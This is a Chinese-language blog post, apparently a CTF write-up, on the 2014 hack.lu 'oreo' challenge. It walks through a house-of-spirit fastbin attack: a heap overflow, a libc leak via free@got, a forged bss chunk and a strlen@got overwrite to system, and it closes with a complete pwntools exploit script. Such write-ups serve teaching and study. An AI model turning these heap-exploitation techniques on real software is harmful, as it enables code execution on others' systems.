@@ -1,0 +1,322 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>柠檬的博客</title>
+<meta name="description" content="我是一个热爱信息安全的普通人，一位CTF入门者，编程语言使用者，一位极客追逐者。" />
+<link rel="shortcut icon" href="https://zhangzy999.github.io//favicon.ico?v=1594478452432">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.7.2/animate.min.css">
+
+<link rel="stylesheet" href="https://zhangzy999.github.io//styles/main.css">
+
+
+
+  </head>
+  <body>
+    <div id="app" class="main px-4 flex flex-col lg:flex-row">
+      <div id="sidebar" class="sidebar-wrapper lg:static lg:w-1/4">
+  <div class="lg:sticky top-0">
+    <div class="sidebar-content">
+      <div class="flex lg:block p-4 lg:px-0 items-center fixed lg:static lg:block top-0 right-0 left-0 bg-white z-50">
+        <i class="ri-menu-2-line lg:mt-4 text-2xl cursor-pointer animated fadeIn" onclick="openMenu()"></i>
+        <a href="https://zhangzy999.github.io/">
+          <img class="animated fadeInLeft avatar rounded-lg mx-4 lg:mt-32 lg:mx-0 mt-0 lg:w-24 lg:h-24 w-12 w-12" src="https://zhangzy999.github.io//images/avatar.png?v=1594478452432" alt="">
+        </a>
+        <h1 class="animated fadeInLeft lg:text-4xl font-extrabold lg:mt-8 mt-0 text-xl" style="animation-delay: 0.2s">柠檬的博客</h1>
+      </div>
+      
+        <div class="animated fadeInLeft" style="animation-delay: 0.4s">
+          <p class="my-4 text-gray-600 font-light hidden lg:block">
+            文章目录
+          </p>
+          <div class="toc-container hidden lg:block">
+            
+          </div>
+        </div>
+      
+    </div>
+  </div>
+</div>
+
+<div class="menu-container">
+  <i class="ri-arrow-left-line text-2xl cursor-pointer animated fadeIn close-menu-btn" onclick="closeMenu()"></i>
+  <div>
+    
+      
+        <a href="https://zhangzy999.github.io/" class="menu" style="animation-delay: 0s">
+          主页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu" style="animation-delay: 0.2s">
+          所有文章
+        </a>
+      
+    
+      
+        <a href="https://zhangzy999.github.io/tags" class="menu" style="animation-delay: 0.4s">
+          标签
+        </a>
+      
+    
+      
+        <a href="https://zhangzy999.github.io/post/dalaoboke" class="menu" style="animation-delay: 0.6000000000000001s">
+          友链
+        </a>
+      
+    
+  </div>
+  <div class="site-footer">
+    <div class="py-4 text-gray-700">HELLO WORLD.</div>
+    <a class="rss" href="https://zhangzy999.github.io//atom.xml" target="_blank">RSS</a>
+  </div>
+</div>
+<div class="mask" onclick="closeMenu()">
+</div>
+      <div class="content-wrapper py-32 lg:p-8 lg:w-3/4 post-detail animated fadeIn">
+        <h1 class="text-3xl font-bold lg:mt-16">fastbin attack(house of sprit) - 2014 hack.lu oreo</h1>
+        <div class="text-sm text-gray-700 lg:my-8">
+          2020-07-11 / 5 min read
+        </div>
+        
+        <div class="post-content yue">
+          <p>题目是这样shai的<br>
+<img src="https://zhangzy999.github.io//post-images/1594477169098.png" alt="" loading="lazy"><br>
+大概是个枪支商店，可以添加枪支，释放枪支，展示枪支信息，留言等等<br>
+然后这个例题难度主要是在逆向分析上，很令人恼火（<br>
+然后说一下house of sprit攻击手法<br>
+主要是有一个目标区域我们没办法控制，但是这个区域之前和之后的区域我们可以控制，我们控制区域之前主要是为了来伪造chunk的size，让其绕过检查机制，控制目标区域之后的位置主要是伪造the next chunk的size，next chunk 的大小不能小于 2 * SIZE_SZ（两个字长），同时也不能大于av-&gt;system_mem，然后还有类似与那种检查size位的ISMMAP位等容易满足的检查，我直接放个wiki上的图，方便以后复习用。<br>
+<img src="https://zhangzy999.github.io//post-images/1594477558899.png" alt="" loading="lazy"><br>
+我是懒狗，不截图了，直接大致说说整体的思路好了<br>
+add功能：<br>
+添加枪支结构体，我们可以输入名字和描述，在名字的位置的地方可以进行堆溢出，覆盖最后一个字长，最后一个字长存储上一个chunk的地址。<br>
+show功能：<br>
+本题目没有后门，我们只能泄露libc基址来拿到system地址，我们选择free函数来泄露即可，由于延迟绑定机制，我们提前申请和释放一个堆块来处理。通过show的打印功能，我们可得到free@got，进而得到system地址。<br>
+free功能：<br>
+从最后一个堆块开始，依次向前free所有堆块。这里的话我们伪造的chunk不在链表的最后部位，即程序无法检测到double free，可以放心的van~<br>
+message功能：<br>
+可以写入留言信息，message指针位于bss段，同时指向bss段某个位置，我们可以写入留言，然后立即调用strlen函数进行一些检查，那么我们可以考虑在message指针这个部位伪造一个chunk，修改message指针到strlen函数的地址，然后我们写入system的地址，这样函数就给我们调用system了。<br>
+综上所述，泄露system地址，然后利用heap overflow伪造一个bss_chunk，然后我们free。（值得一提的是，我们在这之前，bss_chunk_data指针-0x4的位置应该是伪造的chunk的size域，而这个地方恰好是记录了我们add了多少次chunk的变量，所以在exp里我们用了一个for循环来申请chunk，使其变为0x40，来伪造其size。之后我们可以用message功能，编辑信息，伪造next chunk的size。）free之后我们malloc，就得到了一个可控指针，我们劫持strlen函数改为system，传入参数&quot;;/bin/sh\x00&quot;，举个例子，system(&quot;ls;/bin/sh&quot;)相当于分别传入参数ls和binsh，大概就是这个原理，直接写exp</p>
+<pre><code>from pwn import *
+
+context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
+libc = ELF('./libc.so.6')
+p = process('./oreo')
+elf = ELF('./oreo')
+#context.log_level = 'debug' 
+
+def add(name,description):
+	#p.recvuntil('Action: ')
+	p.sendline('1')
+	#p.recvuntil('Rifle name: ')
+	p.sendline(name)
+	#p.recvuntil('Rifle description: ')
+	#pause()
+	p.sendline(description)
+
+def show():
+	#p.recvuntil('Action: ')
+	p.sendline('2')
+
+def free():
+	#p.recvuntil('Action: ')
+	p.sendline('3')
+
+def edit_message(message):
+	#p.recvuntil('Action: ')
+	p.sendline('4')
+	#p.recvuntil('Enter any notice you\'d like to submit with your order: ')
+	p.sendline(message)
+
+def show_current():
+	#p.recvuntil('Action: ')
+	p.sendline('5')
+
+print &quot;====================================&quot;
+print 'step1: leak libc'
+
+add('a','b')
+free() 
+name = 'A' * 27 + p32(elf.got['free'])
+#print 'name:' + name
+description = 'A' * 25
+add(name,description)
+
+show()
+
+p.recvuntil(25*'A')
+p.recvuntil('Description: ')
+free_addr = u32(p.recvuntil('\n',drop = True)[0:4])
+print 'free_address: ' + hex(free_addr)
+libc_base = free_addr - libc.symbols['free']
+system_addr = libc_base + libc.symbols['system']
+print 'system_addr: ' + hex(system_addr)
+
+print &quot;====================================&quot;
+print 'step2: alloc to bss'
+
+# add 0x40 to change the newtimes which replace the size to bypass check
+for i in range(0x40 - 0x2 - 0x1):
+	add('a'*27 + p32(0),'b')
+
+message_pointer = 0x0804a2a8  # fake chunk
+payload = 27*'A' + p32(message_pointer)
+add(payload,'a')
+
+payload = (0x38 - (0x0804a2c0 - 0x0804a2a8) - 0x4) * 'A' + 0x4 * '\x00' + 'aaaa' + p32(0x100)         # in order to bypass the next chunk size check
+edit_message(payload)
+free()
+
+print &quot;======================================&quot;
+print 'step3: attack func &quot;strlen&quot; to get shell'
+
+payload = p32(elf.got['strlen'])
+add('hack',payload)
+edit_message(p32(system_addr) + ';/bin/sh\x00')
+
+p.interactive()
+</code></pre>
+<p>拿shell，很奈斯<br>
+我太菜了</p>
+
+        </div>
+
+        
+          <a class="animated fadeInUp p-2 items-center text-sm text-gray-700 border hover:bg-gray-300 leading-none rounded-full flex lg:inline-flex m-4 " href="https://zhangzy999.github.io/tag/AfBFLoqmx/">
+            <span class="flex-auto">heap overflow</span>
+          </a>
+        
+          <a class="animated fadeInUp p-2 items-center text-sm text-gray-700 border hover:bg-gray-300 leading-none rounded-full flex lg:inline-flex m-4 " href="https://zhangzy999.github.io/tag/I4OcE42w-/">
+            <span class="flex-auto">fastbin-attack</span>
+          </a>
+        
+          <a class="animated fadeInUp p-2 items-center text-sm text-gray-700 border hover:bg-gray-300 leading-none rounded-full flex lg:inline-flex m-4 " href="https://zhangzy999.github.io/tag/u-CmddYJg/">
+            <span class="flex-auto">house of sprit</span>
+          </a>
+        
+
+
+        <div class="flex justify-between py-8">
+          
+
+          
+            <div class="next-post">
+              <a href="https://zhangzy999.github.io/post/buu_pwn_1/">
+                <h3 class="post-title">
+                  buuctf：pwn刷题记录（一）
+                  <i class="ri-arrow-right-line"></i>
+                </h3>
+              </a>
+            </div>
+          
+        </div>
+
+        
+
+      </div>
+    </div>
+
+    <script src="https://zhangzy999.github.io//media/prism.js"></script>  
+<script>
+
+Prism.highlightAll()
+let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+// This should probably be throttled.
+// Especially because it triggers during smooth scrolling.
+// https://lodash.com/docs/4.17.10#throttle
+// You could do like...
+// window.addEventListener("scroll", () => {
+//    _.throttle(doThatStuff, 100);
+// });
+// Only not doing it here to keep this Pen dependency-free.
+
+window.addEventListener("scroll", event => {
+  let fromTop = window.scrollY;
+
+  mainNavLinks.forEach((link, index) => {
+    let section = document.getElementById(decodeURI(link.hash).substring(1));
+    let nextSection = null
+    if (mainNavLinks[index + 1]) {
+      nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+    }
+    if (section.offsetTop <= fromTop) {
+      if (nextSection) {
+        if (nextSection.offsetTop > fromTop) {
+          link.classList.add("current");
+        } else {
+          link.classList.remove("current");    
+        }
+      } else {
+        link.classList.add("current");
+      }
+    } else {
+      link.classList.remove("current");
+    }
+  });
+});
+
+
+document.addEventListener("DOMContentLoaded", function() {
+  var lazyImages = [].slice.call(document.querySelectorAll(".post-feature-image.lazy"));
+
+  if ("IntersectionObserver" in window) {
+    let lazyImageObserver = new IntersectionObserver(function(entries, observer) {
+      entries.forEach(function(entry) {
+        if (entry.isIntersecting) {
+          let lazyImage = entry.target
+          lazyImage.style.backgroundImage = `url(${lazyImage.dataset.bg})`
+          lazyImage.classList.remove("lazy")
+          lazyImageObserver.unobserve(lazyImage)
+        }
+      });
+    });
+
+    lazyImages.forEach(function(lazyImage) {
+      lazyImageObserver.observe(lazyImage)
+    })
+  } else {
+    // Possibly fall back to a more compatible method here
+  }
+});
+
+const menuContainer = document.querySelector('.menu-container')
+const menus = document.querySelectorAll('.menu-container .menu')
+const mask = document.querySelector('.mask')
+const contentWrapper = document.querySelector('.content-wrapper')
+const latestArticle = document.querySelector('.latest-article')
+const readMore = document.querySelector('.read-more')
+const indexPage = document.querySelector('.index-page')
+
+const isHome = location.pathname === '/'
+if (latestArticle) {
+  latestArticle.style.display = isHome ? 'block' : 'none'
+  readMore.style.display = isHome ? 'block' : 'none'
+  indexPage.style.display = isHome ? 'none' : 'block'
+}
+
+const openMenu = () => {
+  menuContainer.classList.add('open')
+  menus.forEach(menu => {
+    menu.classList.add('animated', 'fadeInLeft')
+  })
+  mask.classList.add('open')
+  contentWrapper.classList.add('is-second')
+}
+
+const closeMenu = () => {
+  menuContainer.classList.remove('open')
+  menus.forEach(menu => {
+    menu.classList.remove('animated', 'fadeInLeft')
+  })
+  mask.classList.remove('open')
+  contentWrapper.classList.remove('is-second')
+}
+</script>
+  
+  </body>
+</html>
